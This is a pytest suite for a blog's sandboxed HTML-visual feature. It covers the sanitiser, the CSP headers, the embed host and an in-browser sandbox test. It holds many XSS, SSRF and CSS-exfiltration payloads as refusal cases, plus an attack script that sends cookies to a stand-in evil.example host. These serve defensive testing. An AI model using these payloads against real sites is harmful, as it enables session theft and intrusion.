# ruff: noqa: F811  (pytest fixtures imported from tests/admin_helpers.py are parameters here)
"""In-article HTML visuals: the validator (what is refused, and that the
stored markup is a re-serialisation of what was checked), the wrapper, the
embed origin (exact headers, cookieless, nothing else reachable), the
create_visual tool, and — in a real browser — that a visual's script cannot
reach the parent page, its cookies, the network, popups, top navigation or a
form, and that pause/play and reduced motion work."""

from __future__ import annotations

import shutil

import pytest

from packages.blog import markup, visual
from packages.core.settings import get_settings
from services.api.main import app
from tests import blog_helpers as bh
from tests.admin_helpers import (  # noqa: F401  (fixtures)
    _admin_env,
    bearer,
    client,
    db,
    mail,
    new_admin,
)

MB = "http://localhost:8000/blog/media"
IMG = f"{MB}/{'a' * 64}.webp"


@pytest.fixture(autouse=True)
async def _clean_blog():
    yield
    await bh.purge_blog()


def _v(html: str, css: str = "", js: str = "") -> list[str]:
    _, problems, _ = visual.prepare(html=html, css=css, js=js, width=1600, height=1000, actor="mcp:t", media_base=MB)
    return problems


# ── the validator ────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("html", "needle"),
    [
        ('<iframe src="https://evil.example"></iframe>', "<iframe>"),
        ("<iframe srcdoc='<script>x</script>'></iframe>", "<iframe>"),
        ('<form action="https://evil.example"><input name=a></form>', "<form>"),
        ('<a href="https://evil.example">x</a>', "<a>"),
        ("<input value=x>", "<input>"),
        ("<button>x</button>", "<button>"),
        ('<object data="x.swf"></object>', "<object>"),
        ('<embed src="x.swf">', "<embed>"),
        ('<base href="https://evil.example/">', "<base>"),
        ('<meta http-equiv="refresh" content="0;url=https://evil.example">', "<meta>"),
        ('<link rel="stylesheet" href="https://evil.example/x.css">', "<link>"),
        ("<script>alert(1)</script>", "<script>"),
        ('<svg><script>alert(1)</script></svg>', "<script>"),
        ('<img src="x" onerror="alert(1)">', "event handler"),
        ('<div onclick="x()">x</div>', "event handler"),
        ('<img src="https://evil.example/a.png">', "outside the blog media store"),
        ('<img src="//evil.example/a.png">', "outside the blog media store"),
        ('<img src="http://169.254.169.254/latest/meta-data">', "outside the blog media store"),
        ('<img src="http://localhost:6379/">', "outside the blog media store"),
        ('<img src="file:///etc/passwd">', "outside the blog media store"),
        ('<img src="java&#115;cript:alert(1)">', "outside the blog media store"),
        ('<img src="data:text/html,<script>alert(1)</script>">', "data: URL of type `text/html`"),
        ('<img srcset="https://evil.example/a.png 2x">', "srcset"),
        ('<svg><image href="https://evil.example/a.png"/></svg>', "outside the blog media store"),
        ('<svg><use xlink:href="https://evil.example/s.svg#i"/></svg>', "outside the blog media store"),
        ('<div style="background:url(https://evil.example/a.png)">x</div>', "outside the blog media store"),
        ('<svg><rect fill="url(https://evil.example/p.svg#g)"/></svg>', "outside the blog media store"),
        ("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></p></noscript>", "<noscript>"),
        ("<svg><style>@import 'https://evil.example/x.css';</style></svg>", "<style> inside <svg>"),
        ("<math><mtext><img src=x></mtext></math>", "<math>"),
        ("<template><img src=x onerror=alert(1)></template>", "<template>"),
        (f'<img src="{MB}/../../admin/x.webp">', "not an image of the media store"),
        (f'<img src="{MB}/{"b" * 64}.mp4">', "not an image of the media store"),
    ],
)
def test_refused_markup_is_named(html, needle):
    problems = _v(html)
    assert any(needle in p for p in problems), problems
    assert all(p.startswith(("html line", "html is empty", "css", "js")) for p in problems)


@pytest.mark.parametrize(
    ("css", "needle"),
    [
        ("@import url(https://evil.example/x.css);", "@import"),
        ("@import 'x.css';", "@import"),
        ("@font-face{font-family:x;src:url(https://evil.example/f.woff2)}", "@font-face"),
        (".a{background:url(https://evil.example/a.png)}", "outside the blog media store"),
        ('.a{background:url( "https://evil.example/a.png" )}', "outside the blog media store"),
        (".a{background:url(\\68 ttps://evil.example/a.png)}", "outside the blog media store"),
        ('.a{background-image:image-set("https://evil.example/a.png" 1x)}', "outside the blog media store"),
        # CSS exfiltration by attribute selectors: every probe URL is refused.
        ('input[value^="a"]{background:url(https://evil.example/leak?a)}', "outside the blog media store"),
        (".a{width:expression(alert(1))}", "expression()"),
        (".a{behavior:url(x.htc)}", "`behavior`"),
        (".a{content:'</style><script>alert(1)</script>'}", "may not contain `<`"),
    ],
)
def test_refused_css_is_named(css, needle):
    problems = _v("<div class=a>x</div>", css)
    assert any(needle in p for p in problems), problems


def test_js_rules():
    assert any("</script" in p for p in _v("<div>x</div>", js="var s = '</script><img src=x>';"))
    assert any("outside" in p for p in _v("<div>x</div>", js="fetch('https://evil.example/x')"))
    assert _v("<div id=a>x</div>", js="requestAnimationFrame(function t(){requestAnimationFrame(t)});") == []


def test_allowed_markup_passes_and_is_reserialised():
    html = (
        '<div class="card" style="background:linear-gradient(#fff,#eee)"><h2>หัวข้อ &amp; ตัวเลข</h2>'
        f'<img src="{IMG}" alt="ภาพหน้าจอ" width="300">'
        '<svg viewbox="0 0 24 24" width="48"><lineargradient id="g"><stop offset="0"/></lineargradient>'
        '<path d="M1 1L5 5" stroke="url(#g)"/></svg><div/>ต่อ<!-- comment --><br></div>'
    )
    css = ".card{display:grid;animation:spin 4s linear infinite}@keyframes spin{to{transform:rotate(1turn)}}"
    prepared, problems, urls = visual.prepare(html=html, css=css, js="", width=1600, height=1000, actor="mcp:t", media_base=MB)
    assert problems == [] and prepared is not None and urls == [IMG]
    doc = prepared.document.decode()
    assert '<svg viewBox="0 0 24 24" width="48">' in doc and "<linearGradient" in doc  # SVG names restored
    assert "<div></div>ต่อ" in doc  # `<div/>` is not self-closing in HTML: written as the tree the browser builds
    assert "comment" not in doc and "หัวข้อ &amp; ตัวเลข" in doc
    assert doc.count("<script>") == 1  # the wrapper only — no writer js was sent


def test_size_and_canvas_limits():
    assert any("200 KB" in p for p in _v("<div>" + "ก" * 70_000 + "</div>"))
    _, problems, _ = visual.prepare(html="<div>x</div>", css="", js="", width=100, height=1000, actor="a", media_base=MB)
    assert any("200–2400" in p for p in problems)
    _, problems, _ = visual.prepare(html="<div>x</div>", css="", js="", width=2400, height=300, actor="a", media_base=MB)
    assert any("1:4" in p for p in problems)


def test_wrapper_document():
    prepared, problems, _ = visual.prepare(
        html="<div>x</div>", css="body{overflow:scroll}", js="window.x=1;", width=1080, height=1350, actor="mcp:a", media_base=MB
    )
    assert not problems and prepared is not None
    doc = prepared.document.decode()
    # The picture behaviour comes AFTER the writer's CSS and wins with !important.
    assert doc.index("body{overflow:scroll}") < doc.index("overflow:hidden!important")
    assert "pointer-events:none!important" in doc and "user-select:none!important" in doc
    assert "-webkit-touch-callout:none!important" in doc and "cursor:default!important" in doc
    assert "width:1080px;height:1350px" in doc and "var W=1080,H=1350" in doc
    assert "contextmenu" in doc and "dragstart" in doc and "prefers-reduced-motion" in doc
    assert doc.index("noeyVisual") < doc.index("window.x=1;")  # the wrapper runs first
    # Same creator + same document → same id (immutable); another creator → another id.
    again, _, _ = visual.prepare(html="<div>x</div>", css="body{overflow:scroll}", js="window.x=1;", width=1080, height=1350, actor="mcp:a", media_base=MB)
    other, _, _ = visual.prepare(html="<div>x</div>", css="body{overflow:scroll}", js="window.x=1;", width=1080, height=1350, actor="mcp:b", media_base=MB)
    assert again is not None and other is not None and again.id == prepared.id != other.id


def test_csp_is_exactly_the_spec(monkeypatch):
    monkeypatch.setenv("BLOG_EMBED_PUBLIC_URL", "https://embed.noeystudio.com")
    monkeypatch.setenv("API_PUBLIC_URL", "https://api.noeystudio.com")
    monkeypatch.setenv("BLOG_EMBED_DEV_ANCESTORS", "")
    get_settings.cache_clear()
    assert visual.csp() == (
        "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
        "img-src https://api.noeystudio.com data:; font-src https://embed.noeystudio.com; connect-src 'none'; "
        "form-action 'none'; frame-ancestors https://noeystudio.com https://www.noeystudio.com"
    )
    monkeypatch.setenv("BLOG_EMBED_DEV_ANCESTORS", "http://localhost:3260")
    get_settings.cache_clear()
    assert visual.csp().endswith("frame-ancestors https://noeystudio.com https://www.noeystudio.com http://localhost:3260")


# ── the embed origin ─────────────────────────────────────────────────────────


async def _store_one(tmp_path, monkeypatch) -> str:  # type: ignore[no-untyped-def]
    monkeypatch.setenv("DATA_DIR", str(tmp_path))
    monkeypatch.setenv("BLOG_EMBED_PUBLIC_URL", "https://embed.noeystudio.com")
    get_settings.cache_clear()
    prepared, problems, _ = visual.prepare(html="<div>x</div>", css="", js="", width=1600, height=1000, actor="mcp:a", media_base=MB)
    assert prepared is not None and not problems
    await visual.store(prepared)
    return prepared.id


async def test_embed_host_serves_only_visuals_and_fonts(tmp_path, monkeypatch):
    vid = await _store_one(tmp_path, monkeypatch)
    async with client() as c:
        embed = {"Host": "embed.noeystudio.com", "Cookie": "noey_session=secret; theme=dark"}
        ok = await c.get(f"/visual/{vid}", headers=embed)
        head = await c.head(f"/visual/{vid}", headers=embed)
        font = await c.get("/fonts/NotoSansThai-Variable.woff2", headers=embed)
        missing = await c.get("/visual/" + "0" * 32, headers=embed)
        bad = await c.get("/visual/../../etc/passwd", headers=embed)
        api_through_embed = await c.get("/blog/categories", headers=embed)
        health_through_embed = await c.get("/health", headers=embed)
        post = await c.post(f"/visual/{vid}", headers=embed)
        on_api_host = await c.get(f"/visual/{vid}")
        robots = await c.get("/robots.txt", headers=embed)
    assert ok.status_code == 200 and ok.text.startswith("<!doctype html>")
    assert ok.headers["content-security-policy"] == visual.csp()
    assert ok.headers["x-content-type-options"] == "nosniff"
    assert ok.headers["cache-control"] == "public, max-age=31536000, immutable"
    assert ok.headers["content-type"] == "text/html; charset=utf-8"
    for r in (ok, head, font, missing, bad, api_through_embed, post, robots):
        assert "set-cookie" not in r.headers
        assert "x-request-id" not in r.headers  # the API's own layers never saw it
    assert head.status_code == 200 and head.content == b""
    assert font.status_code == 200 and font.headers["content-type"] == "font/woff2"
    assert font.headers["access-control-allow-origin"] == "*"
    assert missing.status_code == 404 and bad.status_code == 404
    assert api_through_embed.status_code == 404 and health_through_embed.status_code == 404
    assert post.status_code == 405
    assert on_api_host.status_code == 404  # the API host does not serve visuals
    assert robots.text.startswith("User-agent: *\nDisallow: /")


# ── the tool ─────────────────────────────────────────────────────────────────


async def _connect(mail):  # type: ignore[no-untyped-def]
    async with client() as c:
        _, _, session = await new_admin(c, mail)
        return await bh.connect(c, session["access_token"])


async def test_create_visual_tool_stores_audits_and_refuses(mail, tmp_path, monkeypatch):
    monkeypatch.setenv("DATA_DIR", str(tmp_path))
    get_settings.cache_clear()
    t = await _connect(mail)
    async with bh.mcp_client(t["access_token"]) as mcp:
        good = await mcp.call_tool("create_visual", {
            "html": "<div class=a>สามขั้นตอน</div>", "css": ".a{font-size:80px}", "width": 1600, "height": 1000,
            "alt": "แผนภาพสามขั้นตอน", "animated": False, "caption": "ขั้นตอนทั้งหมด",
        })
        bad = await mcp.call_tool("create_visual", {
            "html": '<iframe src="https://evil.example"></iframe><img src="https://evil.example/x.png">',
            "css": "@import 'https://evil.example/x.css';", "width": 1600, "height": 1000, "alt": "ภาพทดสอบ", "animated": True,
        })
        unknown_img = await mcp.call_tool("create_visual", {
            "html": f'<img src="{IMG}">', "css": "", "width": 1600, "height": 1000, "alt": "ภาพทดสอบ", "animated": False,
        })
    assert not good.is_error, good.content
    out = good.structured_content
    assert out["markdown"] == f"::visual[แผนภาพสามขั้นตอน]({out['id']})"
    assert out["preview_url"].endswith(f"/visual/{out['id']}")
    assert (tmp_path / "visual" / f"{out['id']}.html").is_file()
    row = (await db("SELECT created_by, animated, caption, width FROM core.blog_visuals WHERE id = :i", i=out["id"]))[0]
    assert tuple(row) == (f"mcp:{t['client_id']}", False, "ขั้นตอนทั้งหมด", 1600)
    assert bad.is_error
    text = " ".join(getattr(b, "text", "") for b in bad.content)
    assert "<iframe>" in text and "@import" in text and "outside the blog media store" in text
    assert unknown_img.is_error and "not an image of the media store" in " ".join(getattr(b, "text", "") for b in unknown_img.content)
    audit = await db("SELECT ok FROM core.blog_audit_log WHERE action = 'create_visual' AND actor = :a ORDER BY id", a=f"mcp:{t['client_id']}")
    assert [r[0] for r in audit] == [True, False, False]


# ── a real browser: the sandbox and the CSP hold ─────────────────────────────


def _chromium_available() -> bool:
    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except ImportError:
        return False
    return shutil.which("node") is not None


ATTACK_JS = r"""
var r = {};
function report(){ parent.postMessage({type: 'attack-report', r: r}, '*'); }
try { r.cookie = document.cookie; } catch (e) { r.cookie = 'blocked:' + e.name; }
try { r.parentCookie = parent.document.cookie; } catch (e) { r.parentCookie = 'blocked:' + e.name; }
try { r.parentLocation = String(parent.location.href); } catch (e) { r.parentLocation = 'blocked:' + e.name; }
try { r.topLocation = String(top.location.href); } catch (e) { r.topLocation = 'blocked:' + e.name; }
try { r.localStorage = String(window.localStorage); } catch (e) { r.localStorage = 'blocked:' + e.name; }
try { var w = window.open('https://evil.example/popup'); r.open = w ? 'opened' : 'blocked:null'; } catch (e) { r.open = 'blocked:' + e.name; }
try { top.location = 'https://evil.example/top'; r.topNav = 'navigated'; } catch (e) { r.topNav = 'blocked:' + e.name; }
try {
  var f = document.createElement('form'); f.action = 'https://evil.example/form'; f.method = 'post';
  document.body.appendChild(f); f.submit(); r.form = 'submitted';
} catch (e) { r.form = 'blocked:' + e.name; }
var img = new Image(); img.onload = function(){ r.img = 'loaded'; }; img.onerror = function(){ r.img = 'blocked'; };
img.src = 'https://evil.example/pixel.png?' + encodeURIComponent(r.cookie);
var pending = 2;
function done(){ if (--pending === 0) setTimeout(report, 300); }
try { fetch('https://evil.example/fetch').then(function(){ r.fetch = 'ok'; done(); }, function(e){ r.fetch = 'blocked:' + e.name; done(); }); }
catch (e) { r.fetch = 'blocked:' + e.name; done(); }
try { var x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/xhr'); x.onerror = function(){ r.xhr = 'blocked'; done(); };
  x.onload = function(){ r.xhr = 'ok'; done(); }; x.send(); } catch (e) { r.xhr = 'blocked:' + e.name; done(); }
"""


@pytest.mark.skipif(not _chromium_available(), reason="needs the Playwright browser (test-only, never on the server)")
def test_visual_cannot_escape_its_sandbox_in_a_real_browser(monkeypatch):
    """The attacks of spec §9 run inside the iframe exactly as the site embeds
    it (sandbox="allow-scripts", the embed origin's real headers): each must fail."""
    from playwright.sync_api import sync_playwright

    monkeypatch.setenv("BLOG_EMBED_PUBLIC_URL", "https://embed.noeystudio.com")
    monkeypatch.setenv("API_PUBLIC_URL", "https://api.noeystudio.com")
    monkeypatch.setenv("BLOG_EMBED_DEV_ANCESTORS", "")
    get_settings.cache_clear()
    # The attack script goes in UNCHECKED (as if the validator missed it): the
    # browser-side containment must hold on its own.
    result = markup.sanitize("<div id=x>visual</div>", "", mode="visual", media_base="https://api.noeystudio.com/blog/media")
    doc = visual.build_document(html=result.html, css="", js=ATTACK_JS, width=800, height=500, font_origin="https://embed.noeystudio.com")
    headers = visual.response_headers()
    parent = """<!doctype html><html><body><h1>post</h1>
<figure class="visual" style="aspect-ratio: 800 / 500; width: 640px">
<iframe id=v src="https://embed.noeystudio.com/visual/attack" sandbox="allow-scripts" loading="eager" tabindex="-1"
 aria-hidden="true" scrolling="no" referrerpolicy="no-referrer" title=""
 style="width:100%;height:100%;border:0;display:block;pointer-events:none"></iframe></figure>
<script>window.reports=[];addEventListener('message',function(e){if(e.data&&e.data.type==='attack-report')window.reports.push(e.data.r);});</script>
</body></html>"""
    hits: list[str] = []
    with sync_playwright() as p:
        browser = p.chromium.launch()
        ctx = browser.new_context()
        ctx.add_cookies([{"name": "noey_session", "value": "SECRET", "url": "https://www.noeystudio.com"}])

        def route(r):  # type: ignore[no-untyped-def]
            url = r.request.url
            if url.startswith("https://www.noeystudio.com/blog/post"):
                return r.fulfill(body=parent, content_type="text/html")
            if url == "https://embed.noeystudio.com/visual/attack":
                return r.fulfill(body=doc, headers={**headers, "content-type": "text/html; charset=utf-8"})
            if url.startswith("https://embed.noeystudio.com/fonts/"):
                return r.fulfill(body=b"", headers={"content-type": "font/woff2", "access-control-allow-origin": "*"})
            hits.append(url)
            return r.fulfill(body=b"leaked", content_type="text/plain")

        ctx.route("**/*", route)
        page = ctx.new_page()
        page.goto("https://www.noeystudio.com/blog/post")
        page.wait_for_function("window.reports.length > 0", timeout=10_000)
        report = page.evaluate("window.reports[0]")
        top_url = page.url
        pages = len(ctx.pages)
        browser.close()
    assert top_url == "https://www.noeystudio.com/blog/post"  # top navigation did not happen
    assert pages == 1  # no popup
    assert report["cookie"].startswith("blocked:")  # opaque origin: no cookie jar at all
    assert report["parentCookie"].startswith("blocked:") and report["parentLocation"].startswith("blocked:")
    assert report["topLocation"].startswith("blocked:") and report["localStorage"].startswith("blocked:")
    assert report["open"].startswith("blocked") and report["topNav"].startswith("blocked")
    assert report["fetch"].startswith("blocked") and report["xhr"].startswith("blocked") and report["img"] == "blocked"
    assert report["form"] != "submitted" or not any("/form" in h for h in hits)
    assert hits == [], hits  # nothing reached the network: CSP stopped every request


@pytest.mark.skipif(not _chromium_available(), reason="needs the Playwright browser (test-only, never on the server)")
def test_frame_ancestors_and_pause_play_in_a_real_browser(monkeypatch):
    from playwright.sync_api import sync_playwright

    monkeypatch.setenv("BLOG_EMBED_PUBLIC_URL", "https://embed.noeystudio.com")
    monkeypatch.setenv("BLOG_EMBED_DEV_ANCESTORS", "")
    get_settings.cache_clear()
    css = "#b{width:50px;height:50px;background:red;animation:mv 1s linear infinite}@keyframes mv{to{transform:translateX(500px)}}"
    result = markup.sanitize("<div id=b></div>", css, mode="visual", media_base="https://api.noeystudio.com/blog/media")
    js = "parent.postMessage({type:'state', paused: window.noeyVisual.paused}, '*');" \
         "addEventListener('message', function(){ setTimeout(function(){ parent.postMessage({type:'state', paused: window.noeyVisual.paused, " \
         "running: document.getAnimations().filter(function(a){return a.playState==='running'}).length}, '*'); }, 50); });"
    doc = visual.build_document(html=result.html, css=css, js=js, width=800, height=500, font_origin="https://embed.noeystudio.com")
    headers = visual.response_headers()

    def parent_html() -> str:
        return """<!doctype html><body><iframe id=v src="https://embed.noeystudio.com/visual/x" sandbox="allow-scripts"
style="width:400px;height:250px;border:0"></iframe><script>window.states=[];
addEventListener('message',function(e){if(e.data&&e.data.type==='state')window.states.push(e.data);});</script></body>"""

    with sync_playwright() as p:
        browser = p.chromium.launch()
        out = {}
        for origin, motion in (("https://www.noeystudio.com", "no-preference"), ("https://www.noeystudio.com", "reduce"), ("https://evil.example", "no-preference")):
            ctx = browser.new_context(reduced_motion=motion)

            def make_route(origin: str):  # type: ignore[no-untyped-def]
                def route(r):  # type: ignore[no-untyped-def]
                    if r.request.url.startswith(origin):
                        return r.fulfill(body=parent_html(), content_type="text/html")
                    if r.request.url == "https://embed.noeystudio.com/visual/x":
                        return r.fulfill(body=doc, headers={**headers, "content-type": "text/html; charset=utf-8"})
                    return r.abort()

                return route

            ctx.route("**/*", make_route(origin))
            page = ctx.new_page()
            page.goto(f"{origin}/post")
            page.wait_for_timeout(600)
            frame = page.frames[1] if len(page.frames) > 1 else None
            first = page.evaluate("window.states.slice()")
            if first:
                page.evaluate("document.getElementById('v').contentWindow.postMessage({type:'pause'}, '*')")
                page.wait_for_timeout(200)
                page.evaluate("document.getElementById('v').contentWindow.postMessage({type:'play'}, '*')")
                page.wait_for_timeout(200)
            out[(origin, motion)] = {"states": page.evaluate("window.states.slice()"), "frame_url": frame.url if frame else None}
            ctx.close()
        browser.close()
    site = out[("https://www.noeystudio.com", "no-preference")]["states"]
    assert site[0]["paused"] is False
    assert site[1] == {"type": "state", "paused": True, "running": 0}  # pause stops every animation
    assert site[2]["paused"] is False and site[2]["running"] == 1  # play resumes it
    reduced = out[("https://www.noeystudio.com", "reduce")]["states"]
    assert reduced[0]["paused"] is True and all(s["paused"] for s in reduced)  # 'play' is ignored under reduced motion
    assert out[("https://evil.example", "no-preference")]["states"] == []  # frame-ancestors: not rendered elsewhere


def test_app_has_the_embed_layer_outermost():
    assert type(app.middleware_stack).__name__ == "EmbedHostMiddleware" or any(
        m.cls.__name__ == "EmbedHostMiddleware" for m in app.user_middleware[:1]
    )
